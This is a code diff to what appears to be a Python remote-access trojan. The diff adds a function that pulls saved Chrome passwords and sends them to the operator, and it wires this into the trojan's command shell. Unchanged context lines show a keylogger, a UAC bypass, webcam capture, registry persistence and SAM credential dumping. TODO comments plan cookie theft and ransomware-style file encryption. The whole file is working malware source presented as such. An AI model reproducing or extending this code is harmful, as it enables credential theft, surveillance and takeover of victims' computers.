@@ -17,7 +17,7 @@ import requests
 from mss import mss
 
 # Local tools to the application
-from tools import keylogger,uac_bypass
+from tools import keylogger,uac_bypass,chrome
 
 
 
@@ -138,7 +138,6 @@ def capture_webcam():
             print("Failed to save webcam image")
 
 
-# TODO rename from persist to `reg_persist`
 def persist(reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
     try:
@@ -172,8 +171,15 @@ def is_admin():
         pass
         # TODO implmenet checking if these platforms have root/admin access
 
+def chrome_passwords():
+    try:
+        passwords = chrome.chrome_pass()
+        fn = open(passwords,"r")
+        reliable_send(fn.read())
+    except:
+        reliable_send('[-] Error getting passwords from chrome')
 
-# TODO get_chrome_passwords()
+
 # TODO get_chrome_cookies()
 # TODO encrypt_user_dir() ransomware element
 # TODO def encrypt_file_in_dir(file_name, key)
@@ -249,6 +255,9 @@ def shell():
         
         
         # TODO: Not yet to production level
+        elif command[:11] == 'chrome_pass':
+            chrome_passwords()
+
         elif command[:12] == 'get_sam_dump':
             sam_dump, system_dump, security_dump = get_sam_dump()
             reliable_send((sam_dump, system_dump, security_dump))
